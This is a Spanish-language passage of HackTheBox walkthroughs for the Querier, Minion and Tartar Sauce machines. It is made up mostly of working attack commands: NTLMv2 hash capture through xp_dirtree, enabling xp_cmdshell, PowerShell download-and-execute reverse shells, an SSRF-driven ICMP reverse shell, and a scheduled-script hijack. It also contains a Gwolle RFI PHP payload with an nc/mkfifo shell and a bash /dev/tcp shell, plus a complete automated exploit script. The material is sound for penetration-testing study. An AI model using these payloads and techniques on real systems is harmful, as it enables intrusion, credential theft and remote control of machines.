strings Currency\ Volume\ Report.xlsm
```

#### Analisis de ficheros Microsoft office con olevba {-}

**olevba** es un script escrito en python que permite parsear OLE y OpenXML como documentos MS Office (word, excel, ...)
para extraer codig VBA Macros en texto claro, deobfuscate y analyzo de macros maliciosas 

Instalacion

```bash
git clone https://github.com/decalage2/oletools
cd oletools
python3 setup.py install
```

Utilizacion

```bash
olevba Currency\ Volume\ Report.xlsm
```

Aqui olevba nos muestra una macro `ThisWorkbook.cls` y credenciales de base de datos en texto claro.

Antes de intentar conectarnos al servicio MSSQL, validamos las credenciales con crackmapexec.

### Validacion de credenciales con CrackMapExec {-}

```bash
crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTW1HRwryjc$c6'
crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTW1HRwryjc$c6' -d WORKGROUP
```

CrackMapExec nos muestra un **[-]** que quiere decir que el usuario no es valido a nivel de dominio HTB.LOCAL. Pero
nos muestra un **[+]** con el dominio WORKGROUP. Esto quiere decir quel usuario reporting existe a nivel local.

Aqui ya sabemos que la credencial es valida

### Conexion con evil-winrm usuario reporting {-}

Como tenemos credenciales y que sabemos que son validas, intentamos conectarnos con **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.125 -u 'reporting' -p 'PcwTW1HRwryjc'
```

Aqui no funciona.

### Conexion al servicio MSSQL usuario reporting {-}

```bash
/usr/local/bin/mssqlclient.py WORKGROUP/reporting@10.10.10.125 -windows-auth
password: PcwTW1HRwryjc$c6

SQL> 
```

Con MSSQL hay un comando que se llama `xp_cmdshell` que nos permite enviar comandos a nivel de sistema

```bash
xp_cmdshell "whoami"
#Output
[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied
```

Aqui el truquillo seria de configurar la posibilidad al usuario de ejecutar comandos avanzados

```bash
sp_configure "show advanced", 1
#Output
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action
```

Como aqui vemos que el usuario reporting no tiene derechos de lanzar comandos o modificar las configuraciones, lo que vamos a intentar
es entablar una conexion a nivel de red que el proprio usuario reporting no puede hacer porque es usuario local. Hay un comando de
MSSQL llamado `xp_dirtree` que permite buscar ficheros en recursos compartidos

1. En la maquina de atacante, creamos un recurso compartido con smb

    ```bash
    impacket-smbserver smbFolder $(pwd) --smb2support
    ```

1. En el mssql lanzamos el comando

    ```bash
    xp_dirtree "\\10.10.14.8\smbFolder\test"
    ```

Ya podemos ver que la conexion a funcionado y que podemos ver un hash NTLMv2 del usuario **mssql-svc**.
Aqui copiamos el hash en un fichero y lo crackeamos con John. A vezes el hash puede que no sea del todo correcto, y si es
el caso, podemos intentar hacer la misma maniobra con la herramienta **responder** en vez de la **impacket-smbserver**

1. En la maquina de atacante, creamos un recurso compartido con smb

    ```bash
    python3 /usr/share/responder/Responder.py -I tun0 -rdw
    ```

1. En el mssql lanzamos el comando

    ```bash
    xp_dirtree "\\10.10.14.8\EEEE"
    ```

Aqui podemos ver que tambien se puede interceptar el hash NTLMv2.

### Crackeo de hash NTLMv2 con John {-}

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Ya hemos podido crackear el hash NTLMv2 del usuario **mssql-svc**. Y como siempre cuando el servicio **SMB** esta abierto, 
nueva credencial obtenida, nueva credencial que validamos con CrackMapExec.

### Validacion de las creds de mssql-svc {-}

```bash
crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d WORKGROUP
```

CrackMapExec nos reporta un **[+]** quiere decir que las credenciales son validas. Nuevamente intentamos conectarnos por
WinRM

### Conexion con evil-winrm usuario mssql-svc {-}

Como tenemos credenciales y que sabemos que son validas, intentamos conectarnos con **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.125 -u 'mssql-svc' -p 'corporate568'
```

Aqui tampoco nos funciona.

### Conexion al servicio MSSQL usuario mssql-svc {-}

```bash
/usr/local/bin/mssqlclient.py WORKGROUP/mssql-svc:corporate568@10.10.10.125 -windows-auth

SQL> 
```

Intentamos el comando `xp_cmdshell`

```bash
xp_cmdshell "whoami"
#Output
[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component
    'xp_cmdshell' because this component is turned off ...
```

Aqui el error es distincto al del otro usuario. Intentamos nuevamente modificar las configuraciones.

```bash
sp_configure "xp_cmdshell", 1
#Output
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
```

El mensaje de error aqui es claro, y si es una option avanzada tenemos que modificar la config de esta option.

```bash
sp_configure "show advanced", 1
reconfigure
sp_configure "xp_cmdshell", 1
reconfigure
xp_cmdshell "whoami"
#Output

querier\mssql-svc
```

Ahora si. Ya podemos lanzar comandos a nivel de sistema. La idea ahora seria meternos en el sistema con una reverse shell.

<!--chapter:end:10-Querier/10-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Entablar una reverse shell de typo Powershell {-}

Aqui vamos hacer uso de las powershells reversas de Nishang

```bash
git clone https://github.com/samratashok/nishang
cd nishang
cd Shells
cp Invoke-PowerShellTcp.ps1 /home/.../content/PS.ps1
```

En el fichero PS.ps1, añadimos el invoke del script al final del fichero

```Powershell
Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.8 -Port 443
```

Esto nos permite lanzar el Script directamente despues de descargamiento del fichero en la maquina victima


### Enviamos y ejecutamos la reverse shell {-}

1. montamos un http server con python

    ```bash
    python3 -m http.server 80
    ```

1. En la maquina de atacante en una nueva shell

    ```bash
    rlwrap nc -nlvp 443
    ```

1. en la mssql shell

    ```bash
    xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.8/PS.ps1\")"
    ```

Ya estamos a dentro.

### Analizamos el sistema {-}

```bash
whoami
ipconfig
[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
whoami /priv
```

<!--chapter:end:10-Querier/10-03-GainingAccess.Rmd-->

## Escalada de Privilegios {-}

### Rootear la maquina {-}

```bash
whoami /priv
#Output

SEImpersonatePrivilege
```

Aqui ya vemos que podemos escalar privilegios con `JuicyPotatoe.exe` o `RotenPotatoe.exe` pero S4vitar nos
muestra aqui una via alternativa de escalar privilegios en esta maquina.

```bash
git clone https://github.com/PowerShellMafia/PowerSploit
cd PowerSploit
cd Privesc
vi PowerUp.ps1
```

Aqui vamos a hacer lo mismo que con el fichero `PS.ps1`. En vez de enviarlo y despues invocarlo, matamos dos pajaros
de un tiro y añadimos el **Invoke** al final del fichero `PowerUp.ps1`

```bash
Invoke-AllChecks
```

1. Creamos un servicio web con python

    ```bash
    python3 -m http.server 80
    ```

1. En la maquina victima

    ```bash
    IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/PowerUp.ps1')
    ```

Este script nos reporta un monton de cosas y aqui podemos ver

- SEImpersonatePrivilege
- Service UsoSvc
- encotro la contraseña para el usuario Administrator en un fichero Groups.xml

### Validamos las credenciales del usuario Administrator {-}

```bash
crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' -d WORKGROUP
```

Ya vemos un **[+]** y un **(Pwn3d)**. Quiere decir que podemos connectarnos al systema con `psexec`

### Conexion con psexec.py {-}

```bash
psexec.py WORKGROUP/Administrator@10.10.10.125 cmd.exe

whoami
#Output
nt authority\system
```

Ya estamos como root y podemos ver la flag ;)

> [!] NOTA: S4vitar nos enseña mas tecnicas para conectarnos en el video. Os invito a verlas a partir del minuto 1:24:20

<!--chapter:end:10-Querier/10-04-PrivilegeEscalation.Rmd-->

# Minion {-}

## Introduccion {-}

La maquina del dia 03/08/2021 se llama Minion
.

El replay del live se puede ver aqui

[![S4vitaar Minion maquina](https://img.youtube.com/vi/l0mCUUHATr4/0.jpg)](https://www.youtube.com/watch?v=l0mCUUHATr4)

No olvideis dejar un like al video y un comentario...

<!--chapter:end:11-Minion/11-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.57
```
ttl: 127 -> maquina Windows. 
Recuerda que en cuanto a ttl respecta 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.57 
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.57 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p62696 10.10.10.57 -oN targeted
```

| Puerto | Servicio   | Que se nos occure? | Que falta? |
| ------ | ---------- | ------------------ | ---------- |
| 62696  | http - IIS | Web, fuzzing, .asp |            |


### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.57:62696
```

Nada muy interesante

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p62696 10.10.10.57 -oN webScan
```

No nos detecta nada

#### Chequear la web por puerto 62696 {-}

Con firefox navegamos en la web para ver lo que es.

La pagina esta under construction y poco mas.


#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.57:62696/FUZZ
```

Encontramos un ruta `/backend` pero no se ve nada en firefox. Decidimos fuzzear con la extension `.asp`

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.57:62696/FUZZ.asp
```

Aqui encontramos un fichero `test.asp` y navigando no dice que no encuentra el parametro `u` que tendria que ser un URL.
Intentamos ver si se conecta a nuestro servidor web

1. Creamos un servidor web

    ```bash
    python3 -m http.server 80
    ```

1. Intentamos conectar por la web 

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://10.10.14.8
    http://10.10.10.57:62696/test.asp?u=http://10.10.14.8/test
    ```

Aqui no pasa nada. La idea aqui, como solo tiene un puerto abierto seria de explorar si tiene puerto privados usando localhost

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost
```

Aqui ya vemos que el puerto 80 interno de la maquina esta abierto. Decidimos descubrir los puertos abiertos de la maquina con WFUZZ


### Descubrimiento de los puertos abiertos con WFUZZ {-}

Wfuzz permite hacer rangos de numeros con el parametro `-z`

```bash
wfuzz -c -t 200 --hc=404 -z range,1-65535 http://10.10.10.57:62696/test.asp?u=http://localhost:FUZZ
```

Como nunca va a existir un codigo de estado 404, (porque el recurso existe), wfuzz no va a reportar como validas todas
las requests. Hay que lanzar una vez y occultar las palabra que son de 89

```bash
wfuzz -c -t 200 --hc=404 --hw=89 -z range,1-65535 http://10.10.10.57:62696/test.asp?u=http://localhost:FUZZ
```

Aqui vemos que solo el puerto 80 esta abierto.



Esto funciona. Pero no vemos en la web el output del comando. Solo vemos el codigo de estado (0 si el comando a funcionado, 1 si no a funcionado)


<!--chapter:end:11-Minion/11-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### Analizamos la web interna por el puerto privado 80 {-}

Aqui se puede ver un panel de administrador donde parece que podamos ejecutar comandos a nivel de sistema. Si pinchamos el link
no nos va a dejar porque nos lleva a una url interna `127.0.0.1/cmd.aspx`. Pero si la introducimos directamente en 

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx
```

functiona.

Si le lanzamos un whoami, nos redirige en una url un poco turbia. Analizando el codigo fuente vemos que la peticion es get con el
nombre xcmd.

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=whoami
```

### Controlamos si tenemos conectividad con la maquina de atacante {-}

1. Nos ponemos en escucha por trasa ICMP

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. en la web

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=ping 10.10.14.8
    ```

Como es una maquina windows, tenemos que recivir 4 pings y es el caso. Tenemos conectividad con la maquina victima.


<!--chapter:end:11-Minion/11-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Entablar una reverse shell {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Preparamos un nc.exe para la maquina victima

    ```bash
    locate nc.exe
    cp /usr/share/sqlninja/apps/nc.exe ./content
    ```

1. Nos creamos un registro compartido a nivel de red

    ```bash
    cd content
    impacket-smbserver smbFolder $(pwd) -smb2support
    ```

1. En la web

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=\\10.10.14.8\smbFolder\nc.exe -e cmd 10.10.14.8 443
    ```

En este caso no responde y vemos un exit status 1. Intentamos de varias maneras

1. Nos creamos un registro compartido a nivel de red

    ```bash
    impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar123
    ```

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=net use x: \\10.10.14.8\smbFolder /user:s4vitar s4vitar123
```

No responde y vemos un exit status 2.

Intentamos con un servidor web.

1. Nos creamos un servidor web

    ```bash
    python3 -m http.server 80
    ```

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=certutil.exe -f -urlcache -split http://10.10.14.8/nc.exe nc.exe
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell iwr -uri http://10.10.14.8/nc.exe -OutFile test
```

No responde y vemos un exit status que no es 0.

Aqui vemos que las conexiones por TCP no funcionan. Puede ser porque hay reglas definidas que no permiten utilizar TCP y S4vitar
nos adelanta que tampoco funccionna por UDP.

Aqui hemos podido comprobar que:

- tenemos capacidad de ejecucion remota de commando.
- tenemos conectividad por trasa ICMP
- el protocolo TCP esta bloqueado
- el protocole UDP esta bloqueado

Segun esta analisis intentamos crearnos una reverse shell por **ICMP**

### Entablar una reverse shell por ICMP {-}

1. Nos descargamos el Nishang

    ```bash
    git clone https://github.com/samratashok/nishang
    cd nishang
    cd Shells
    cp Invoke-PowerShellIcmp.ps1 ../../icmp.ps1
    cd ../..
    vi icmp.ps1
    ```

Aqui como tenemos que pasar por la url de la web para enviarnos el fichero, tenemos que preparar el fichero.

1. Ejecucion de comandos prealables en nuestra maquina

    ```bash
    sysctl -w net.ipv4.icmp_echo_ignore_all=1
    wget https://raw.githubusercontent.com/bdamele/icmpsh/master/icmpsh_m.py
    ```

1. Añadimos el invoke al final del fichero

    ```bash
    Invoke-PowerShellIcmp -IPAddress 10.10.14.8
    ```

1. Borramos todo los comentarios que hay en el fichero
1. Borramos todo los saltos de linea

    ```bash
    cat icmp.ps1 | sed '/^\s*$/d' > icmp
    rm icmp.ps1
    mv icmp icmp.ps1
    ```

1. Utilizamos una powershell

    ```bash
    pwsh
    ```

1. Codificamos el fichero en base64

    ```bash
    $fileContent = Get-Content -Raw ./icmp.ps1
    $fileContent
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
    $encode = [Convert]::ToBase64String($bytes)
    $encode | Out-File icmp.ps1.b64
    ```

1. En una shell linux normal modificamos los symbolos `+` y `=` para encodearlos en urlencode

    ```bash
    php --interactive
    print urlencode("+");
    %2B
    print urlencode("=");
    %3D
    ```

1. Modificamos todos los symbolos `+` por **%2B** y los symbolos `=` por **%3D**
1. Spliteamos el fichero en dimensiones de lineas iguales

    ```bash
    fold icmp.ps1.b64 > icmp
    ```

1. Nos creamos un script para automatizar el envio de cada linea del fichero

    ```bash
    #!/bin/bash

    function ctrl_c(){
        echo -e "\n\n[!] Saliendo...\n"
        exit 1
    }
    
    # Ctrl+C
    trap ctrl_c INT

    for line in $(cat icmp.ps1.b64); do
        command="echo ${line} >> C:\Temp\reverse.ps1"
        curl -s -v -X GET "http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx" --data-urlencode "xcmd=$command"
    done
    ```

1. Lanzamos el Script

    ```bash
    ./fileUpload.sh
    ```

1. Controlamos en la web si el fichero existe

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=type C:\Temp\reverse.ps1
    ```

    Vemos el status code a 0

1. Decodificamos desde la web el fichero que esta en base64
    
    - las etapas serian estas

        ```bash
        $file = Get-Content C:\Temp\reverse.ps1 
        $decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file))
        $decode > C:\Temp\pwned.ps1
        ```

    - y en la url de la web seria:

        ```bash
        http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell $file = Get-Content C:\Temp\reverse.ps1; $decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file)); $decode > C:\Temp\pwned.ps1
        ```

1. Lanzamos el script python previamente descargado

    ```bash
    rlwrap python icmpsh_m.py 10.10.14.8 10.10.10.57
    ```

1. Ejecutamos el pwned.ps1 desde la web

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell C:\Temp\pwned.ps1
    ```

Por fin estamos adentro de la maquina ;)


<!--chapter:end:11-Minion/11-03-GainingAccess.Rmd-->

## Escalada de Privilegios {-}

### Rootear la maquina {-}

```bash
whoami /priv
#Output

SEImpersonatePrivilege
```

Aqui ya vemos que podemos escalar privilegios con `JuicyPotatoe.exe` o `RotenPotatoe.exe` pero S4vitar nos
muestra aqui una via alternativa de escalar privilegios en esta maquina.

#### Secuestro de comandos para copiar los ficheros del usuario decoder.MINION {-}

```bash
dir c:\
dir c:\sysadmscripts
```

Vemos en `C:\` un directorio raro llamado `sysadmscript`. En este directorio, hay dos ficheros:

- c.ps1
- del_logs.bat

Analizando con el comando type lo que hacen estos script, vemos que el `del_logs.bat` llama al fichero `c.ps1` y lo
ejecuta con **powershell**. Aqui pensamos que hay una tarea que se ejecuta a intervalo regular de tiempo que ejecuta el fichero
`del_logs.bat`. Miramos si podemos modificar los ficheros.

```bash
cacls c:\sysadmscripts\del_logs.bat
cacls c:\sysadmscripts\c.ps1
```

Modificamos el Script para copiar los ficheros del usuario **decoder.Minion**

Aqui vemos que solo podemos modificar el fichero `c.ps1`

```bash
echo "dir C:\Users\decoder.MINION\Desktop\ > C:\Temp\decoder_desktop.txt" > C:\Temp\c.ps1
echo "copy C:\Users\decoder.MINION\Desktop\user.txt > C:\Temp\decoder_user.txt" >> C:\Temp\c.ps1
echo "copy C:\Users\decoder.MINION\Desktop\* > C:\Temp\" >> C:\Temp\c.ps1
copy C:\Temp\c.ps1 C:\sysadmscripts\c.ps1
```

Esperando un poco, nos copia los ficheros en `c:\temp`. Podemos visualizar la flag del usuario.
Tambien vemos un fichero `backup.zip` y si le chequeamos por **Aditionnal Data Streams** con el comando

#### Lectura de Additionnal Data Strems y crackeo de Hash {-}

```bash
Get-Item -Path C:\Temp\backup.zip -stream *
```

Vemos que tiene un stream llamado pass. Lo miramos con el comando `type`

```bash
type C:\Temp\backup.zip:pass
```

y encontramos un hash. Si lo pasamos por [crackstation](https://crackstation.net/) nos da la contraseña.

#### Ejecucion de comandos como administrator con ScriptBlock {-}

Aqui el problema es que no tenemos conectividad con **smb** o otros puertos para conectarnos como root. La idea
aqui seria de ejecutar comandos como administrator para cambiar la reglas del Firewall.

```bash
$user = 'minion\administrator'; $pw = '1234test'; $secpw = ConvertTo-SecureString $pw - AsPlainText -Force; $cred = New-Object \
System.Management.Automation.PSCredential $user, $secpw; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {whoami}

#Output
minion\administrator
```

Aqui vemos que podemos ejecutar comando como el usuario administrator. Vamos a por el cambio en el firewall

```bash
$user = 'minion\administrator'; $pw = '1234test'; $secpw = ConvertTo-SecureString $pw - AsPlainText -Force; $cred = New-Object \
System.Management.Automation.PSCredential $user, $secpw; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock \
{New-NetFirewallRule -DisplayName setenso -RemoteAddress 10.10.14.8 -Direction inbound -Action Allow}

#Output
minion\administrator
```

Si ahora desde la maquina de atacante le hacemos un nmap para ver los puertos abiertos

```bash
nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.57
```

vemos que tenemos todo expuesto y como hay el puerto 3389 que es el puerto **RDP** ya nos podemos conectar con Remmina por ejemplo.

<div class="figure">
<img src="images/minion-remina.png" alt="minion remmina connection" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-22)minion remmina connection</p>
</div>

Y ya estamos en la maquina como administrator

<div class="figure">
<img src="images/minion-pwned.png" alt="minion remmina pwned" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-23)minion remmina pwned</p>
</div>

<!--chapter:end:11-Minion/11-04-PrivilegeEscalation.Rmd-->

# Tartar Sauce {-}

## Introduccion {-}

La maquina del dia 04/08/2021 se llama Tartar Sauce
.

El replay del live se puede ver aqui

[![S4vitaar Tartar Sauce maquina](https://img.youtube.com/vi/5Sm69L3zdqM/0.jpg)](https://www.youtube.com/watch?v=5Sm69L3zdqM)

No olvideis dejar un like al video y un comentario...

<!--chapter:end:12-TartarSauce/12-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.88
```
ttl: 63 -> maquina Linux. 
Recordar que en cuanto a ttl se trata 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.88 
```

Si consideras que va muy lento, puedes utilizar los siguientes parametros para que 
tu escaneo sea mucho mas rapido

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.88 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80 10.10.10.88 -oN targeted
```

| Puerto | Servicio | Que se nos occure?       | Que falta? |
| ------ | -------- | ------------------------ | ---------- |
| 80     | http     | Web, fuzzing, robots.txt |            |


### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.88
```

Nada muy interesante

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.88 -oN webScan
```

No nos detecta nada

#### Chequear la web por puerto 80 {-}

Con firefox navegamos en la web para ver lo que es. 

Nada interesante aqui. 

Miramos lo que hay en el `robots.txt` que nmap nos a encontrado. En el `robots.txt` vemos rutas que son **disallow**. 

- **/webservices/tar/tar/source/**
- **/webservices/monstra-3.0.4/**
- **/webservices/easy-file-uploader/**
- **/webservices/phpmyadmin**

Quitando partes de las rutas disalloweadas, vemos que la routa `http://10.10.10.88/webservices` esta forbidden y no estan Not Found como cuando
le ponemos la ruta completa. Esto quiere decir que esta ruta existe y que puede existir otros recursos debajo de ella. Vamos a Fuzzear este directorio.

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.88/webservices/FUZZ
```

Encontramos un ruta `/webservices/wp/`. Lo chequeamos en firefox. 

#### Checkeamos la ruta webservice/wp {-}

Analizando vemos

- La pagina no se ve bien
- Wapalizer nos dice que es un wordpress
- En el codigo fuente vemos un tartartsauce.htb

Como se aplica virtualhost routing, añadimos el dominio `tartartsauce.htb` al `/etc/hosts`


Ya se ve la web mejor y podemos mirar la web por `http://tartartsauce.htb/webservices/wp/`



<!--chapter:end:12-TartarSauce/12-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### Buscando vulnerabilidades {-}

Muchas vulnerabilidades en Wordpress se encuentran buscando los plugins instalados. Para enumerar los plugins instalados
en wordpress, se puede fuzzear la web con el uso de un diccionario especial de SecList.

```bash
git clone https://github.com/danielmiessler/SecLists
cd SecLists
cd Discovery/Web-Content/CMS/
```

Con **WFUZZ** utilizamos el diccionario de SecList llamado `wp-plugins.fuzz.txt`.

```bash
wfuzz -c -t 200 --hc=404 -w wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
```

Encontramos un plugin que se llama `gwolle-gb`

Por la web intentamos ver `http://tartartsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/` y no se ve nada. Pero como no nos
da un NotFound quiere decir que existe. Vamos buscando a ver si encontramos un exploit para este plugin


### Buscando un exploit con searchsploit {-}

```bash
searchsploit gwolle
```

Aqui vemos que existe un exploit para Gwolle que no permitte hacer Remote File Inclusion. Analizamos el exploit para saber lo que se puede hacer.

```bash
searchsploit -x 38861
```

Podemos ver que un parametro GET llamado **abspath** que no esta sanitizado correctamente antes de estar utilizado por la funcion require de PHP.
Un atacante podria incluir de manera remota un fichero llamado `wp-load.php` para ejecutar su contenido en la web vulnerable. Ademas el exploit 
nos muestra sobre que ruta tendriamos que ejecutar un metodo get para ejecutar el comando

`http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]`

La idea aqui seria de comprobar si esto es verdad.

### Comprobamos la efectividad del exploit {-}

1. Montamos un servidor web en la maquina de atacante

    ```bash
    python3 -m http.server
    ```

1. Lanzamos una peticion GET sobre el url que el exploit nos da

    ```bash
    curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
    ```

Aqui podemos comprobar que la maquina victima no esta enviando una peticion get a nuestro servidor web creado en python. A demas se puede ver que
la maquina victima esta intentando buscar un fichero `wp-load.php` que por el momento no existe.


<!--chapter:end:12-TartarSauce/12-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Entablar una reverse shell desde la vulnerabilidad Gwolle {-}

1. Creamos el fichero `wp-load.php` que contiene

    ```php
    <?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
    ?>
    ```

1. Montamos un servidor web desde la maquina de atacante

    ```bash
    python3 -m http.server
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Lanzamos la peticion get con curl

    ```bash
    curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
    ```

Ya podemos comprobar que estamos dentro de la maquina

```bash
whoami
#Output

www-data

hostname-I
#Output

10.10.10.88
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Analizamos la maquina {-}

```bash
cd /home
ls
cd /onuma

id
sudo -l
#Output

(onuma) NOPASSWD: /bin/tar
```

Aqui vemos que hay un usuario onuma en el directorio home pero no tenemos capacidad de acceso. Tambien vemos que podemos usar 
el comando tar como el usuario **onuma** sin proporcionar contraseña.

### User Pivoting al usuario onuma {-}

Como es posible utilizar el comando tar como el usuario onuma sin propocionar contraseña, vamos a la pagina [GTFOBINS](https://gtfobins.github.io/) y buscamos 
una manera de entablarnos una shell como el usuario onuma

```bash
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
whoami
#Output

onuma
```

Aqui ya podemos ver la flag.

### Automatizamos el acceso en bash {-}

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo ...\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

# ./exploit.sh -u www-data/onuma

function helpPanel(){
    echo -e "\n[!] Uso: $0 -u www-data/onuma\n"
    exit 1
}

function makeWWWDataFile(){
cat << EOF > wp-load.php
<?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
?>
EOF
}

function makeOnumaFile(){
cat << EOF > wp-load.php
<?php
    system("echo '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.8/443 0>&1' > /dev/shm/s4vishell.sh");
    system("sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=\"bash /dev/shm/s4vishell.sh\"");
?>
EOF
}

function makeRequest(){
    if [ "$(echo $username)" == "www-data" ]; then
        makeWWWDataFile
        python3 -m http.server 80 &>/dev/null &
        curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
        rm wp-load.php
        kill -9 $(lsof -i:80 | grep "python" | awk '{print $2}') &>/dev/null
    elif [ "$(echo $username)" == "onuma" ]; then
        makeOnumaFile
        python3 -m http.server 80 &>/dev/null &
        curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
        rm wp-load.php
        kill -9 $(lsof -i:80 | grep "python" | awk '{print $2}') &>/dev/null
    else
        echo -e "\n[!] El usuario es invÃ¡lido\n"
        exit 1
    fi
}

declare -i parameter_counter=0; while getopts ":u:h:" arg; do
    case $arg in
        u) username=$OPTARG; let parameter_counter+=1;;
        h) helpPanel;;
    esac
done

if [ $parameter_counter -eq 0 ]; then
    helpPanel
else
    makeRequest
fi
```

Para usar este script, nos tenemos previamente que poner en escucha por el puerto 443 y con otra shell, usar el exploit:

- para acceder a la maquina como el usuario www-data

    ```bash
    ./exploitTheThing.sh -u www-data
    ```

- para acceder a la maquina como el usuario onuma

    ```bash
    ./exploitTheThing.sh -u onuma
    ```




<!--chapter:end:12-TartarSauce/12-03-GainingAccess.Rmd-->

## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
cd /root
id
sudo -l
```

Aqui vemos que no podemos hacer nada y que no tenemos posiblidad de rootear la maquina por vulnerabilidades del propio usuario.
Tenemos que enumerar el sistema.

```bash
uname -a
lsb_release -a
cd /
find \-perm -4000 2>/dev/null
cat /etc/cron
crontab -l
ls /var/spool/cron/
